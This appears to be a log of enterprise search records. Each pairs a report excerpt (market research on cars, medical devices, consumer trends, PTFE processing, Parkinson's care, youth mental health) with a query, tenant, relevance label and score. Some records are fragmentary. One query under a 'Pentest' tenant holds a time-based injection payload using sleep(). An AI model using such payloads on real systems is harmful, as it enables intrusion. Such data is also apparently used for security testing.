Typical headlines\ninclude bold statements like \u201cMillennials trust people over\nbrands\"137 and that Millennials are \"leaders in 'word-of-mouth'\nrecommendations\". 138\n\nbut only part\nof the story.\n\nOf course, purchasing decisions are complicated and explaining them\nin such simple terms across categories, sectors, brands and subgroups\nis impossible. However, what is clear from the available evidence\n\nis that Millennials do say they are more influenced by social media,\nknown peers, opinion leaders and experts than other generations. 139\nBut in a similar vein to above, the key point is they say they are more\ninfluenced by all sources - including traditional advertising.\n\nData from Ipsos Loyalty \u00b940 indicates that Millennials in the US draw\non a richer and more varied pool of resources to make decisions\nabout choosing or continuing to use brands.

This is arguably one of the most\nchallenging threats to deal with, though a solution is to prevent your children from\ncreating social media profiles in the first place. Let them know they can create\ntheirs when they're older. If you don't want to do this, remind your children that\nthey can always come to you if they're being bullied, whether online or not.

That starting point presupposes that a system\ncan be created to which uncontrolled access is no longer\npossible and in which the digital connectivity of infrastructures\nis massively increased so that the autonomous vehicles in-volved can also benefit from the intelligence of the overall sys-tem. The related debates on urban planning, transport, and\nemployment policy, as well as legal and ethical issues, have\nnot even begun yet. If those concerns are put to one side for\na moment, as well as fears of the \"transparent\" customers\nthat are fed by the idea of automated driving, the 24\/7 oper-ation of an automated ride sharing vehicle fleet could really\nbecome, according to a study by the International Transport\nForum of the OECD (2015), the starting point for a large-scale\nand sustainable redevelopment of urban areas (see the fol-lowing side-bar).\n\nSide-bar:\n\nThe potential of automation\n\nIn a study, the OECD World Transport Forum examined the potential\nof automation. Drawing on the example of Lisbon, the study shows\nthat it would take only a vehicle fleet that is just less than 10 percent\nof today's fleet, in combination with a well-functioning and modern-ised public transport system, to achieve nearly identical levels of mo-bility to those achieved today. According to the World Transport Fo-rum, this assessment can be applied to most central European cities.\nIt would be the starting point for a far-reaching redevelopment of\ncities that would make use of the enormous free spaces. Since the\nnew utilisation model means that vehicles, whether stationary or in\nmotion, will not require much urban space due to the combination\nof automation and the platform economy, that space could then be\nreallocated to allow for the expansion of cycling infrastructure and\nto enhance the urban quality of life with large green spaces, areas\nfor local mobility, children's recreational streets, and new residential\nproperties (ITF\/OECD 2017).\n\nIn sum, three key discourses and development options for auton-omous driving can be identified. First, autonomous driving as a very\nserious, long-standing, and evolutionary project of the German auto\nindustry; second, autonomous vehicles as a disruptive tech project\nof tech giants from California and increasingly from China, with the\ngoal of connecting the technology with new usage and consumption\nforms and thus generating large amounts of data and high sales; and\nthird, autonomous driving a building block of an intermodal urban\ntransport system with the aim of achieving an overall optimisation\nand transformation of transport.\n\n3.2.4 MOBILITY AS A SERVICE\n\nThe fourth mobility trend is the aforementioned erosion of\nthe automotive ownership culture. A growing number of cus-tomers, especially younger urban residents, are increasingly\nfocusing less and less on the inelegant, environmentally ineffi-cient, and economically irrational ownership of vehicles in urban\ntransport contexts. Instead, they expect reliable, flexible and,\nat the same time, cost-effective access to modern, combinable\ntransport systems including automobile usage concepts. His-torically, car sharing - pay per use instead of pay and use - was\n\nmotivated by ecological and moral concerns. Today, by contrast,\nwe can observe a very rational mix of cost concerns among\nyounger market participants with tight budgets, along with\nsustainability motives and functional pragmatism (Deloitte 2017).\n\n3.2.5 FUTURE PATHS OF THE\nAUTOMOTIVE INDUSTRY\n\n\"Networking, autonomous driving, ride sharing, and electric\nmotors - each of these four trends has the potential to turn\nour industry upside down. But the real revolution lies in the\nintelligent combination of the four trends\" (Dieter Zetsche,\nsee Daimler 2017). The current situation could hardly be more\nsuccinctly described. For 100 years, automobility has been\nunequivocally linked to an individual's ability to own and drive\na vehicle him or herself. Both are now open to change. The\nsame applies to the internal combustion engine. The following\nchart, Figure 3, summarises the development paths that can\nbe derived from the new setting. This diagram is helpful for\nmapping different future pathways for different regions of\nthe world with different spatial and settlement conditions in\nthe context of the three ideal-typical trajectories.\n\nFigure 3\n\nSharing and automation will change individual transport\nPossible future paths of the automobile industry\n\nAutonomous\nprivate\nvehicles\n\nOwnership\n\nHuman-driven\nprivate vehicles\n\nSource: Morgan Stanley 2015.\n\nAutonomous\ndriving\n\nHuman\ndriving\n\nTAXI\n\nT:\n\nAutonomous\nxis\n\n14\n\nSharing\n\nHuman-driven\nsharing vehicles\n\nFor example, robotic electric driving as a usage-efficient service\nin combination with public transport is an extremely realistic\nprospect in dense Asian urban regions - provided that the tech-nological promises of feasibility are actually kept. It appears\nit will be particularly beneficial in China, because urban settle-ment structures are still being built there and the urban and\ntraffic planning requirements governing automated driving can\nbe used to fuel a leap in innovation.\n\nBy contrast, in rural regions all over the world, car owner-ship is likely to remain fairly stable in the future, but here too,\nthere will be trends towards automation, as far as technol-","summary":" Summary of the changes in the automotive industry in 2018, which are leading to a transformation by design or by disaster","query":"autonomous driving barriers","tenant":"Mercedes","assessment":"yes","score":0.0000002382}

These communities must strive to become more inclusive, adopting pro-\nageing narratives whilst including those going through early menopause as well as trans and non-binary people.\n\n\u25aa Brands must adopt an education aspect for women as knowledge of the impact of hormonal fluctuations on the skin\nremains low, while concerns about phytoestrogens remain high.

{"text":"3.4g Patient Monitors - Regional Trends\n\nAfrica\n\nThe African patient monitors market is very diverse, with varying trends across the continent; North\nand South Africa largely purchase higher-end solutions than the central regions. Central Africa is\nknown for low-levels of healthcare development and plagued by political corruption. North and South\nAfrica have shown progression to improve healthcare facilities and largely purchase higher-end\nsolutions than the central regions, including patient monitoring. However, pricing here is much lower\nthan in other regions.\n\nMost of the African market is heavily dependent on tender-driven purchasing and large projects to\nhelp develop necessary healthcare infrastructure. The demand in North and South Africa to purchase\nsolutions with high-end functionality has started to reduce, with a 'less is more' approach to\nsolutions, to help improve facilities in resource-restricted establishments. Like many regions, the\nCOVID-19 pandemic has highlighted the lack of qualified physicians and nurses in the continent\nresulting in a drive to recruit new resource. Solutions that are easy to use by newly trained qualified\npersonnel are seen to be most beneficial.\n\nPrior to the pandemic there was a considerable amount of hospital construction in Africa which was\nsupported by EU funds. But since the pandemic, corruption has increased, and funds have been\nmisappropriated. As a result, the African market is expected to be set-back several years. It is hoped\nthat EU and UN funding will return to the continent to help facilitate the improvement in hospital\nfacilities, subsequently driving growth. Africa is also significantly behind other regions in the\ndevelopment of hospital infrastructure, with a lack of power and thus need for digital solutions.\nThere is also a lack of professionally trained physicians to cater to the significant population. As such\nthe demands for new solutions often vary to those seen in other regions, with ease-of-use, battery\npower and portability being a greater focus in purchasing decisions.\n\nAcceptance of lower cost vendors from China has increased in recent years, with North Africa\nshowing more preference for Chinese players due to their presence in the countries, and the\ninvestment they have been making into healthcare development.\n\nProduct\n\nTotal\n\nMulti-parameter Continuous Monitors\nCentral Station Monitors\n\nMobile Continuous Cardiac Telemetry Devices\nSpot Check Vital Signs Monitors\nMobile Continuous Devices Market\nSingle-Parameter Monitors Market\n\nAfrica\n\nRevenues ($m)\n\nSignify\n\nRESEARCH\n\nCAGR\n\n2026\n(21-26)\n135.8 6.8%\n112.3 7.0%\n6.4 6.7%\n1.4\n","summary":"research report published by Signify Research in May 2022, providing market data, briefings, presentations and all associated publications for the Patient Monitors - World - 2022 report.","query":"what are patient monitoring trends in africa?","tenant":"Philips","assessment":"yes","score":1.0}

{"text":"Brazil: After the slowdown of the 90's the focus\nshifts to stability\n\nThe government has tried to inspire investor confidence in the country by promoting some fundamental reforms such as\nreforms in the judicial and pension systems, the implementation of a bankruptcy law designed to enhance prospects for\nfinancially troubled companies and their creditors and the promotion of a private-public partnership scheme for investment\n\nin infrastructure.\n\nBrazil continues to strive for a global recognition\n\nDATAMONITOR\n\nBrazil wants to be recognized as an international political force and is therefore pushing for permanent membership of the\nUN Security Council. Brazil was the driving force behind the creation of MERCOSUR and is its dominant member. The\ncountry has been especially active in recent WTO discussions, leading a contingent of developing nations against the\nsuggested policy changes of the G8.\n\nHowever, Brazil's opposition to the US-led invasion of Iraq and Lula's long-standing friendship with Latin America's other\nleading left-wingers like Venezuela's Hugo Chavez and Cuba's Fidel Castro, have had some negative effect on their\nbargaining position in the UN. But recently, the US and Brazil have adopted a pragmatic approach in dealing with each\nother.\n\nLula's government needs to balance social objectives with economic reforms\n\nA major challenge facing Lula's government lies in the fact that it needs to balance extant national policies, earlier opposed\nby his own party, and its institutions\/programs while constructing a new policy framework. This is further amplified by the\ngovernment's compulsion to maintain a stable relationship with domestic and international markets.\n\nThis contradiction was most evident with the recent educational policy changes. Prior to its election into power and while it\nformed the opposition, the Workers' Party (WP) voiced its concerns about problems of educational segregation, exclusion\nand discrimination, forcing the then government and the public to recognize the need to remedy such disparities. However,\nsince the WP came into power, it has faced numerous challenges in trying to solve these problems such as finding a\nsolution to the teacher deficit (over one million new teachers are needed in Brazil) and tackling the structural issues\ninvolved in financing education. In fact, Dr. Gentili, political analyst and professor from the University of the State of Rio de\nJaneiro, voiced disappointment with the first forty-five days of Lula's regime pointing that \". . . they have been much less\n'heroic' than we all expected.\"\n\nThough hindered by certain structural problems, economic growth now looks steady\nBrazil's economic performance has a strong base\n\nBrazil has a large labor force and is well placed in terms of natural resources such as iron ore, manganese, crude oil and\nother minerals. The economy is driven primarily by the industrial and services sectors which contribute approximately 40%\nand 51.6% to GDP respectively.\n\nAn export-promotion strategy has led to a positive trade balance over the last two years. The Brazilian experience of 4.9\nand 3.4 percent economic growth in 2004 and first half of 2005 respectively has in fact been led by a surge in exports,\nwhich have reached record highs. Exports nearly doubled from $57.4 billion to $111.5 billion in the 12 months through\nSeptember 2005.

If the pigment is to be mixed with\nthe powder paste in a dry state (e.g. for anti-static applications, carbon black dyeing), the\npigment is screened directly onto the powder\nand the mix is then homogenized in dry state\nthrough rolling. After that, the lubricant is added\nand handled as described in Section 4.4. This\navoids formation of agglomerates to a large\nextent. If any agglomerates persist, cooling as\nper Section 4.1 or screening as per Section 4.3\nshould be carried out.\n\n4.6 Maturing of the\nExtrusion Mix\n\nA homogeneous distribution of the lubricant in\nthe PTFE can be obtained by letting the mix \"ma-ture\". This ripening process should take over-night or at best over 24 hours in tightly sealed\ncontainers. Longer times are not necessary.\n\nTip:\n\nHigher temperatures (e.g. 30 \u00b0C) during\nthe maturing process ensure improved\ndistribution of the lubricant and provide\nmore homogeneous extrusion quality.\n\n4.7 Preform Compression\n\nIn this processing step, the mix of 3M\u2122 Dyneon\u2122\nPTFE Fine Powder and lubricant is fed into a\npreform press where it is compacted into a cy-lindrical preform.\n\nThe aim of the compression is to eliminate the\nair contained in the mix of powder paste and\nlubricant and to bring the mix into a form that\ncan be fed into the extrusion cylinder without\nany problems. The cylinder of the preform press\nshould be three times the length of the preform,\nas the powder is compressed to 1\/3 of its vol-ume. The mix of powder and lubricant should be\ncompacted slowly so as to allow the air to com-pletely escape from the mix in the preform cyl-inder. This process can be supported by a vacu-um placed at the ventilation bores. Pre-pressing\ntakes several minutes at a pressure of approx.\n30-50 bar. The quality of the finished products\nis, among other things, dependent on a preform\nwithout cracks. The compression pressure is\ntherefore only slowly decreased and care must\nbe taken when removing the preform from the\npreform cylinder. The compacted part must\nthen be immediately processed to reduce evap-oration of the lubricant from the surfaces to a\nminimum.\n\nInhomogeneous distribution of the lubricant\nresults in quality and dimensional variations of\nthe finished product. The preform is fed into the\npaste extruder the cylinder of which should\nhave a diameter that is 1 mm larger than the\nouter diameter of the preform.\n\n4.8 Extrusion\n\nBecause of the different handling procedures,\nthe topic of \"extrusion\" is dealt with in specific\nsections titled \"Fabrication of Films and Tapes\",\n\"Fabrication Tubes\", \"Fabrication of Thick-Walled Pipes (Liners)\" and \"Fabrication of Ca-ble and Wire Insulations\". For paste extrusion,\nram extruders with a relatively simple design\nare used where the preform is extruded through\nthe die of a ram extruder.\n\nTip:\n\nPreforms containing lubricant can be stored\nin air-tight, sealed containers. In order to\nensure a uniform lubricant atmosphere in\nthe storage drum, a cloth impregnated with\nlubricant is enclosed in the container. This\nprevents the surface of the preform from\ndrying out. In doing so, the precautionary\nmeasures stated in Section 4.3 must be\nobserved.\n","summary":"technical report on the processing of 3M\u2122 Dyneon\u2122 PTFE Fine Powder, focusing on the physical fundamentals of the material, production, and properties.","query":"What are the properties of handling Dyneon PTFE fine powder?","tenant":"Finance","assessment":"yes","score":0.9999993338}

These changes in\neating patterns also mean that consumers require snacks that can give them the\nnutrition they require - which is why a high-protein snack is increasingly in demand.\nThey are also being converted to mini-meals for a nutritious quick-fix, which are also\ngood for the environment, triggered by a larger conscious population being on the\nrun. They are thus moving beyond nut butter, guacamole, eggs, yogurt, and moving\non to more filling snacks such as burgers and salami bites. There has also been a shift\nto kiosks, delis, food trucks, cafes, and off-site outlets which are fueling the \"fresh\nsnack\" trend of which plant-based meat is a large part.\n\nSource: Arizton\n","summary":"market research report on the plant-based meat industry in the US from 2019 to 2024, covering products, storage, channels and segments.","query":"What are the latest snack trends?","tenant":"Nestletryitpilot","assessment":"yes","score":1.0}

{"text":"be to give a convenient and seamless shopping experience. Looking at what the CBM in Figure\n1 shows, safety and health might get less attention as the perceived risk goes down. On the\nother hand, how companies have acted and continues to act while the pandemic is still\nspreading, in regard to offering a safe and healthy experience, might be remembered in the long\nterm and affect future consumer decisions and behaviour.\n\nSome researchers believe that consumers have had time and opportunity during Covid-19 to\nreflect on the meaning of consumption and what impact they leave with their own consumption.\nThey further think that Covid-19 will mark an onset of a sustainable consumption transition,\nwhere consumers will reflect on how and what to consume, and from whom. Some of the\ninterviewees similarly explain that Covid-19 has made people more aware of the larger global\nperspective on how consumption and the way people act affects the world. They believe that\nsocial sustainability has increased in importance due to this, and that consumers might have an\neasier time to relate to companies and brands that are meaningful, show that they care, and take\nsocial responsibility during the pandemic. The increased importance of social sustainability\nmight be explained by the cultural and social factors that affect consumers' decision-making\nand behaviour, as explained in the CBM. Cultures have become more influenced by global\nperspectives due to the pandemic, and in turn also consumers, as the culture influences\nconsumer's value system. Further, people put more pressure on each other and on companies,\nwhich influences people's attitudes and behaviours. When it comes to how Covid-19 has\naffected consumers' view on environmental sustainability, the interviewees are of different\nopinions. Some say that it has increased, but some also say that the willingness to pay for it is\nunclear, and that other factors like price and convenience might be more important. However,\nboth the literature and the interviews conclude that sustainability will continue to increase in\nimportance in the future, as it has been doing the recent years. If this will depend on the\npandemic or rather on that the new generation has a more sustainable consumption pattern, is\nless clear. Linking back to the CBM, as the pandemic has affected the society both culturally\nand socially regarding how people view sustainability, these factors will probably remain after\nthe pandemic has passed by, and thus affect the future view of consumption.\n\nBoth the literature and interviews say that people have spent much more time in their home,\nand that the home has taken on a larger role in people's lives. This has also led to that the\nnumber of activities people do in their homes have increased and includes every part of a\nperson's life; exercising, eating, working, etc., which both literature and the interviewees agree\non. This leads to that the amount of needs the home must fill increases, leading to an increased\nneed for a functional home. Another consequence that both agree on is that the home also needs\nto be more homely, cosy and beautiful, as people need to enjoy spending time there, and that\npeoples' interest for home decor and taking care of their homes have increased. As this is a\nbehaviour that has been consistent for a long time during the pandemic, it has likely affected\nseveral of the factors influencing consumer decision-making and behaviour. Spending more\ntime at home, and using the home for everything, has become a habit, and has therefore affected\npsychological factors. The more important role of the home has been rooted in the culture and\nthe social context. As the role of the home has affected several of the factors in the CBM, it is\nreasonable to think that after the pandemic the role of the home will continue to be more\n","summary":" Master's thesis from 2021 about consumer behaviour changes during the Covid-19 pandemic in Sweden, conducted through a literature study and a case study","query":"what is the affect of the pandemic on shopping?","tenant":"Poc11","assessment":"yes","score":0.9999963517}

{"text":"ES\n\nExecutive Summary - CT\n\nThe CT market saw a sharp growth in sales in 2020, from $4.1 billion in 2019 to $5.1 billion in 2020, as\nhealthcare capital resources were shifted to the diagnosis, monitoring and care of COVID-19 patients. CT\nscans were an essential element of many countries' efforts to diagnose and monitor COVID-19 patients. In\npercentage terms, highest growth was seen in Argentina, Spain & Portugal and Russia. In absolute revenues,\nthe largest increase was in China. Lower-end equipment (17-63 slices) experienced the sharpest increases.\n\nIn 2021, CT sales continued enhanced growth, to $5.8 billion. Lower-end sales continued as developing\ncountries that had been spared in the first wave were impacted by subsequent waves. Concurrently, higher-end sales increased as developing countries took advantage of healthcare investment funds to revitalise aging\nequipment and to expand clinical capabilities. The highest growth rates were seen in Rest of Asia, Italy,\nBenelux and India.\n\nGlobal CT sales will see moderate growth rates over the forecast period, reaching $6.9 billion in 2026 at a\nCAGR of 3.7%. Investment in revitalizing equipment and primary provisioning will be the main market growth\ndrivers. Supply chain and logistics issues will lead to ASP increases in 2022. Growth rates are slowing in the\nmajor markets of China and the US, due to slowing national investment and a drive for value-based care\nrespectively. Largest CT growth rate increases are anticipated for the Middle East and Emerging Asia regions.\n\n2021 saw the commercial release of photon-counting CT (PCCT). PCCT is a game changing technology that\ndetects and records individual photons, instead of integrating all energy that arrives at the detector. PCCT\nreduces scan lengths and radiation doses while improving image quality and providing tissue characertisation\ninformation. PCCT devices are currently located in research facilities driving improved disease understanding\nbut will see spread to higher tier healthcare facilities in the 5-7 year time period.\n\nSoftware improvements have increased CT's clinical capabilities. Compressed sensing allows for faster\nscanning with improved image quality, thereby improving throughput while also improving clinical precision.\nEdge AI now assists with operational workflows, including radiation dose management, patient positioning,\nimage acquisition and image reconstruction. Software improvements are driving increasing use of CT in the\nfields of neurology, cardiology, pulmonology and orthopedics.\n\nThe CT market is highly consolidated, with 6 international vendors accounting for 93.0% market share.\nSiemens Healthineers at 32.0% and GE Healthcare at 30.1% are the two market leaders. With an increased\nfocus on global sales, United Imaging, Canon and Fujifilm hope to experience significant growth outside their\nhome markets over the forecast period. The push to value-based care and new purchasing models in\ndeveloped economies will favour vendors able to provide a fully resourced `imaging service line' offering,\nincluding multi-modality sales and servicing, business analytics and business insights.\n\nLeigh Hart\n\nSenior Analyst, Signify Research\nLeigh.Hart@signifyresearch.net\n\nSignify\n\nRESEARCH\n\nLong considered a mature market, the CT equipment market experienced a\nsharp rise in demand in 2020 associated with CT's frontline role in\ndiagnosing and monitoring COVID-19. Sustained investment levels\ncontinued in 2021, due to investment to revitalize ageing equipment and\nimproving clinical capabilities in developed economies and to continue\nprimary provisioning in developing economies.\n\nTechnological changes are leading to renewed excitement and investment\nin CT equipment. Recent hardware improvements are lowering scan doses\nthrough X-ray source filtering. A larger impact is seen from software\nimprovements that are lowering radiation dosing and lowering scan times\nwhile concurrently improving image quality. However, the most notable\ntechnological change is arrival of the long-anticipated technology of photon\ncounting CT (PCCT) into the commercial market. PCCT produces an order\nchange more detailed imaging at lower dosing, while also providing\nspectral information to help characterise tissues. PCCTS advantages are\ngame-changing and will improve disease diagnosis and treatment planning.\nFor the moment, the cost of PCCT devices limits their commercial spread\nbeyond research facilities.\n\nDespite the headwinds of supply chain and shipping logistics challenges,\nCT investment will continue at high levels for the next two to three years.\nIn addition to continued revitalization and provisioning efforts, the need to\ntackle the backlog in elective care and\/or provide value-driven care will see\nincreasing investment in premium equipment that offers optimised\nworkflows. Further drivers to CT equipment growth are the modality's\nexpanded ability to provide cardiac imaging and the recent expansion of\nCT's use in lung, stroke and MSK imaging.\n","summary":"market research report published by Signify Research in June 2022, covering computed tomography equipment.","query":"Is the CT market growing?","tenant":"Philips","assessment":"yes","score":1.0}

{"text":"7 HOW TO MANAGE CUSTOMERS\n\nWhen selling a smart home system we must pay attention to what we offer to our customers.\nWe often present them all the possibilities offered by the technology, but sometimes we forget\nthat for most homeowners, even a small improvement in the operation of their building means a\nlot.\n\nThe most satisfied are usually those customers who have a built-in basic smart home system\nthat meets all their requirements. Maybe it's just lighting control and a simple upgrade from one\nthermostat for the whole house to multiple thermostats for each room separately. Most of them\ndo not want to have an automated whole home, but are satisfied with a small improvement in\nperformance.\n\n7.1 PROBLEM DEFINITION\n\nWhen we start talking about the use of modern technology in buildings, one of the possible\nprocedures is to define the problem and then solve it. Let's look at two practical examples.\n\nA young couple expecting a child is building a new house. When talking to them, mention that\nyou can set the switches so that they will turn the lights on to different brightness levels\ndepending on the time of day, and not as with classic lights, where most lamps light up at full\nfirst. Then present a practical example such as e.g. controlling of the child in the middle of the\nnight. We can avoid to turn on the lights and stumble on one of the toys we didn't put away, or\nwe can turn on the light and wake the child up completely. For example, we can show to our\ncustomers which are the advantages of lighting with different levels of illumination at different\ntimes of the day. It is important that we do not offer a solution yet. This comes later.\n\nAnother example is the case of a restorer renovating a bar. Since the bar is a business, the\nowners are primarily aware and interested in the price of renovation. For example we can\npresent to the owner at least one of the advantages offered by light regulation, e.g. reducing the\nlight to achieve a more romantic atmosphere in the bar, making visitors feel more comfortable. If\nthis is not possible, they will probably not return to the bar often and there will also be fewer or\nlower tips.

{"text":"Parkinson's disease in adults\n\nPharmacological management of motor symptoms\n\n6 Pharmacological management of motor\n\nsymptoms\n\nParkinson's disease is a progressive neurodegenerative condition resulting from the death of\nthe dopamine containing cells of the substantia nigra. There is no consistently reliable test that\ncan distinguish Parkinson's disease from other conditions that have similar clinical\npresentations. The diagnosis is primarily a clinical one based on the history and examination.\nPeople with Parkinson's disease classically present with the symptoms and signs associated\nwith parkinsonism, namely hypokinesia (i.e., poverty of movement), bradykinesia (i.e.,\nslowness of movement), postural instability, rigidity and sometimes a rest tremor.\n\nThere is no single drug of choice in the initial pharmacotherapy of early Parkinson's disease,\nparticularly as no two Parkinson's disease patients present the same and they often do not\nrespond to medication in the same way. The clinical question to be addressed is the\ncomparative effectiveness of first-line treatments of motor symptoms e.g. levodopa, dopamine\nagonists, monoamine oxidase B (MAO-B) inhibitors and amantadine, as these medications\nhave been used as first line treatments, but their comparative effectiveness is unclear.\n\nLevodopa is converted into dopamine by the body, and therefore helps to replace the\ndopamine that is lost as part of Parkinson's disease. Dopamine agonists stimulate nerve cells\nin the brain in a similar way to dopamine. MAO-Bs reduce the amount of dopamine broken\ndown in the brain, by blocking the enzyme which does so. Finally, amantadine both increases\ndopamine release and blocks dopamine reuptake. These are no known theoretical reasons\nwhy one class of drugs should be more effective than another.\n\nAs levodopa is currently the most commonly prescribed treatment for the motor symptoms of\nParkinson's disease, but its effectiveness decreases with time and significant adverse motor\ncomplications may develop, it is also important to answer the clinical question of the best\npharmacotherapy adjuvants to oral levodopa. Clinicians often aim to keep the dose of\nlevodopa as low as possible to maintain good function and reduce the development of motor\ncomplications, and so it is important to assess the effectiveness of drug therapy adjuvants to\nlevodopa as they are likely to be used as the condition progresses. In addition to the drugs\ndescribed above (dopamine agonists, MAO-Bs and amantadine), catechol-O-methyltransferase (COMT) inhibitors and anticholinergics have also been used at this stage in\nthe treatment pathway.\n\nCOMT inhibitors block an enzyme which breaks down levodopa, thereby prolonging its effect\nand enabling lower levodopa doses to be used. When anticholinergics are used at all, this is\nmost commonly in the earlier stages of Parkinson's disease, with the aim of improving motor\nsymptoms.\n\n60\n\nISBN 978-1-4731-2530-8\n\nUpdate 2017\n","summary":" Guide to diagnosis and management of Parkinson's disease in adults, developed by the National Institute for Health and Care Excellence in July 2017","query":"parkinsons disease treatment","tenant":"Healthcare","assessment":"yes","score":1.0}
{"text":"Key Findings & Implications:\n\nThe interface between bouillon and broth\n\nWhen choosing between bouillon or broth, the nature of the dish and its\nability to 'handle' bouillon (or broth) is considered \u2013 i.e., the dish's\ndesired\/intended flavour (e.g., soup, risotto is better suited to broth which\nwill not overpower whereas when strong or boosted flavour is required,\nbouillon may be a better fit).\n\nConvenience is also a consideration. Time, inclination (or not) to take an\nextra step to prepare the bouillon, availability on hand, and whether there\nis an open\/readily available broth\/stock in the fridge can sway usage choice\nbetween the two formats.\n\nThe quantity-cost equation is a further consideration. Some dishes justify\nbroth irrespective of size (e.g., if recipe demands, or if liquid \/ broth is 'star'\ningredient of the dish). But, some will consider the quantity required for\nthe dish and whether bouillon or broth is more viable. Large dishes which\nrequire a lot (e.g., cups of stock) may opt for bouillon to reduce the cost\nper serving.\n\nUnderpinning the above is the sense (by some) that broth\/stock is fresher,\nless processed and healthier (more nutritious). This is cued by the liquid\nformat, the necessary refrigeration post opening, on-pack images and\nclaims, as well as the notion that it is something close to \u2018home-made'.

How does Knorr open up consumers to\nthe flexibility and options available to them within the brand range?\n\nBouillon and broth are not 'identical' competing products. Might be\nopportunity to anchor in intense flavour that you can \"dose\" \/ tailor as\nneeded vs. broth with its set flavour level (less tailorable).

{"text":"WHAT THE EVIDENCE SAYS\n\nthose who maintain contact for long periods, Face-book and Instagram likes on posts, and Twitter's\nretweet function.\n\nGreater social media use, night-time specific social\nmedia use and emotional investment in social me-dia are all associated with poorer sleep, and higher\nlevels of anxiety and depression (Woods and Scott,\n2016[21]). Again, it is not clear whether anxious\nadolescents use social media more, or depressed\nadolescents use social media to regulate their low\nmood.\n\nWhereas most of these effects are small and the\ndirection of cause and effect unclear, some impacts\nare large and well defined. For example, a signifi-cant association has been found between playing\nvideo games in the evening and sleep deprivation\namong teenagers, where a 30 minute increase\nin time spent on computer games increases the\nlikelihood of reporting lack of sleep by 50% com-pared to the average (Billari, Giuntella and Stella,\n2018[6]).\n\nDigital platforms can provide help and\nfoster a sense of social inclusion\n\nigital platforms are often an extension of\nyoung people's offline lives a space to catch\nup with friends and talk about school, home-work or plans for the weekend. Online platforms\ncan provide a space where children and young peo-ple feel able to discuss topics that might be trickier\nin their offline lives.\n\nWith digital technologies being so readily acces-sible, children and young people are increasingly\ndrawing upon information and support online.\nDigital health interventions, particularly comput-erised cognitive behavioural therapy (CCBT) for\ndepression and anxiety in adolescents and young\nadults, have shown some promising signs (Hollis et\nal., 2017 [22]). Organisations such as England's\nDigital Mentality create and develop apps specifi-cally designed to support children and young peo-ple's mental health, while Digital Dog in Australia is\ndeveloping a suite of online mobile apps, websites\nand games to help lower depression, lower suicide\nrisk, reduce stress and promote wellbeing. Apps\nsuch as Rally Round allow parents, friends and car-ers to organise support for a child with an illness or\nchallenging behaviour; Bluelce and Calm Harm helps\nyoung people manage their emotions and reduce\nurges to self-harm; while Catch It and SilverCloud\nhelp to manage feelings of anxiety and depression.\n\nThe ability to instantaneously connect with others\ncan foster a sense of social inclusion among users\nwho may feel excluded or who are seeking a wel-coming community, including those who are autistic\nor have depression (Carras et al., 2018[23]). These\nchannels can provide destigmatised spaces foster-ing the ability to share personal stories, enhance\nsocial networks, and learn about resources from\npeers, as well as gain information, insights and\nstrategies for coping with challenges. Online safe\nspaces such as It's Ok To Talk in India and ReachOut.\ncom in Australia allow children and young people\nto share experiences and seek online support with\nmental health, mental illness and wellbeing.\n\nDigital platforms also provide tools for\ncyber-bullying\n\n\"he digital space also introduces new risks and\nstresses into young people's lives. Bullying in\nschool or by peers is sadly still too common\nbut the pervasive nature of social media means\nthat harassment can continue beyond the school\ngates, and can even take place anonymously. Just\nas with traditional forms of bullying, exposure to\ncyber-bullying \u2013 for instance the rapid creation\nand sharing of offensive messages or comments,\nspreading rumours, excluding victims from online\ngroups and other forms of harassment - is associ-ated with a wide range of negative outcomes, in-cluding depressive symptoms, substance use, idea-tion and suicide attempts (Bottino et al., 2015[24]).\n\nThere is evidence of a rise in cyber-bullying in some\ncountries - whether this rise is in proportion to the\nincrease in internet use, or because of increased\nawareness and reporting of cyber-bullying, is un-known (Livingstone, Stoilova and Kelly, 2016[7]).\nIn other countries, there is evidence of a peak\nin incidence of cyber-bullying, especially where\ninternet use has itself possibly peaked in terms of\nreach (Livingstone, Stoilova and Kelly, 2016[7]). The\nhighest rates of cyber-bullying among OECD coun-tries within Europe are found in Lithuania, Hungary\nand Latvia (World Health Organization, 2016[13]).\nWhile both forms of bullying are associated with\npoorer mental wellbeing, in-person bullying has\nbeen found to be more common (Livingstone,\nStoilova and Kelly, 2016[7]) and has a much greater\neffect on wellbeing compared to cyber-bullying\n(Przybylski and Bowes, 2017[25]). Perpetrators of\ncyber-bullying are found equally among boys and\ngirls and across teenage years. In contrast, boys\nand younger teenagers predominantly commit\nin-person bullying (Livingstone, Stoilova and Kelly,\n2016[7]).\n\nChildren & Young People's Mental Health in the Digital Age\n","summary":" Report on the mental health challenges facing children and young people in the digital age, including concerns about digital technology and social media, and the need for action","query":"1\"||sleep(27*1000)*ojyzpc||\"","tenant":"Pentest","assessment":"no","score":0.0}

{"text":"UNITED STATES\n\nHow is the delivery system organized and financed?\n\nPublicly financed health care: In 2013, public spending accounted for about 48 percent of total health care\nspending, although this figure is expected to increase post-ACA (OECD, 2015). Medicare is financed through a\ncombination of payroll taxes, premiums, and federal general revenues. Medicaid is tax-funded and administered\nby the states, which operate the program within broad federal guidelines. States receive matching funds from\nthe federal government for Medicaid at rates that vary based on their per-capita income-in 2014, federal\nmatching ranged from 50 percent to 73 percent of states' Medicaid expenditures (ASPE, 2014). The expansion\nof Medicaid under the ACA is fully funded by the federal government through 2017, after which the\ngovernment's funding share will be phased down to 90 percent by 2020. Federal premium subsidies on the\nexchanges are offered as tax credits.\n\nPrivately financed health care: In 2013, private health insurance spending accounted for about 33 percent\nof total health care spending (CMS, 2015a). Private insurers, which can be for-profit or nonprofit, are regulated\nby state insurance commissioners and subject to varying state (and federal) regulations. Private health insurance\ncan be purchased by individuals but is usually funded by voluntary, tax-exempt premiums, the cost of which\nis shared by employers and workers on an employer-specific basis, sometimes varying by type of employee.\nThe employer tax exemption is the government's third-largest health care expenditure (after Medicare and\nMedicaid), reducing tax revenues by $260 billion per year (NBER, 2014).\n\nSome individuals are covered by both public and private health insurance. For example, many Medicare\nbeneficiaries purchase private supplemental Medigap policies to cover additional services and cost-sharing.\nPrivate insurers, in general, pay providers at rates higher than those paid by public programs, particularly\nMedicaid. This disparity leads to wide variations in provider payment rates and revenues, which depend to\na large extent on payer mix and market power.\n\nMedicare's payment rates are typically determined according to a fee schedule, with various adjustments based\non cost of living and other local and provider characteristics. Medicaid rates vary by state. Private health insurers\ntypically negotiate payment rates with providers.\n\nPrimary care: Primary care physicians account for roughly one-third of all U.S. doctors. The majority operate\nin small self- or group-owned practices with fewer than five full-time-equivalent physicians, although larger\npractices are becoming increasingly common. Practices-particularly large ones-often include nurses and other\nclinical staff, who are usually paid a salary by the practice. Patients 